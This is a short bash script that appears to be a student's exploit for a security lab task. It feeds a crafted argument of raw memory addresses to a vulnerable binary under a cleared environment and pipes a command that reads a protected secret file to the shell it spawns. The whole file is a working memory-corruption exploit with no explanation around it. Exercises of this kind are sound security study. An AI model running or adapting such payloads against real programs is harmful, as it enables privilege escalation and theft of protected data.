#!/usr/bin/env bash
echo /bin/cat /task4/secret.txt | env -i SHELL=/bin/sh \
  /task4/s1828233/vuln "$(python -c "print('\x10\xee\xe1\xf7\xd4\xd8\xff\xff\x8f\xd8\xf5\xf7')")" 1208
